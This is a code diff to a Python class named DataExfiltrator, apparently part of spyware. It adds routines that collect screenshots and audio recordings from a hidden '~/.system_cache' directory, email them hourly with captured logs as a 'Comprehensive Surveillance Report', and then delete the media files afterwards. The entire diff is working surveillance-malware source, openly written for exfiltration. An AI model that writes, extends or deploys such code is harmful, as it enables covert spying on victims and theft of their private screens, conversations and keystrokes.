@@ -151,27 +151,104 @@ class DataExfiltrator:
             use_tls=email_config.get('use_tls', True)
         )
         self.is_running = False
+        self.screenshot_dir = os.path.expanduser('~/.system_cache/screenshots')
+        self.audio_dir = os.path.expanduser('~/.system_cache/audio')
+    
+    def collect_screenshots(self) -> List[str]:
+        """Collect all screenshot files."""
+        screenshots = []
+        if os.path.exists(self.screenshot_dir):
+            for file in os.listdir(self.screenshot_dir):
+                if file.endswith(('.png', '.jpg', '.jpeg')):
+                    screenshots.append(os.path.join(self.screenshot_dir, file))
+        return screenshots
+    
+    def collect_audio_files(self) -> List[str]:
+        """Collect all audio files."""
+        audio_files = []
+        if os.path.exists(self.audio_dir):
+            for file in os.listdir(self.audio_dir):
+                if file.endswith(('.wav', '.mp3', '.ogg')):
+                    audio_files.append(os.path.join(self.audio_dir, file))
+        return audio_files
+    
+    def send_comprehensive_report(self, log_file: str, include_media: bool = True) -> bool:
+        """Send comprehensive report with logs, screenshots, and audio."""
+        attachments = []
+        
+        # Add log file
+        if os.path.exists(log_file):
+            attachments.append(log_file)
+        
+        # Add screenshots and audio if requested
+        if include_media:
+            screenshots = self.collect_screenshots()
+            audio_files = self.collect_audio_files()
+            attachments.extend(screenshots)
+            attachments.extend(audio_files)
+        
+        if not attachments:
+            return False
+        
+        # Create report body
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        body = f"Comprehensive Surveillance Report\n"
+        body += f"Generated: {timestamp}\n\n"
+        
+        if os.path.exists(log_file):
+            with open(log_file, 'r', encoding='utf-8') as f:
+                log_content = f.read()
+            body += f"Log Content:\n{log_content}\n\n"
+        
+        if include_media:
+            body += f"Screenshots: {len(screenshots)} files\n"
+            body += f"Audio Recordings: {len(audio_files)} files\n"
+        
+        # Send email
+        subject = f"Comprehensive Report - {timestamp}"
+        return self.email_exfil.send_email(subject, body, attachments)
     
     def start_periodic_exfiltration(self, log_file: str, interval: int = 3600):
-        """Start periodic data exfiltration."""
+        """Start periodic data exfiltration with media files."""
         self.is_running = True
         
         def exfil_periodically():
             while self.is_running:
                 time.sleep(interval)
                 try:
-                    self.email_exfil.send_log_data(log_file, "Periodic Report")
-                except Exception:
-                    pass
+                    # Send comprehensive report every hour
+                    self.send_comprehensive_report(log_file, include_media=True)
+                    
+                    # Clean up sent files to save space
+                    self.cleanup_sent_files()
+                except Exception as e:
+                    print(f"Exfiltration error: {e}")
         
         thread = threading.Thread(target=exfil_periodically, daemon=True)
         thread.start()
         return thread
+    
+    def cleanup_sent_files(self):
+        """Clean up files after successful exfiltration."""
+        try:
+            # Clean screenshots older than 1 hour
+            screenshots = self.collect_screenshots()
+            for screenshot in screenshots:
+                if time.time() - os.path.getmtime(screenshot) > 3600:
+                    os.remove(screenshot)
+            
+            # Clean audio files older than 1 hour
+            audio_files = self.collect_audio_files()
+            for audio in audio_files:
+                if time.time() - os.path.getmtime(audio) > 3600:
+                    os.remove(audio)
+        except Exception:
+            pass
     
     def stop_exfiltration(self):
         """Stop periodic exfiltration."""
         self.is_running = False
     
     def send_immediate_report(self, log_file: str) -> bool:
-        """Send immediate report."""
-        return self.email_exfil.send_log_data(log_file, "Immediate Report") 
+        """Send immediate comprehensive report."""
+        return self.send_comprehensive_report(log_file, include_media=True) 
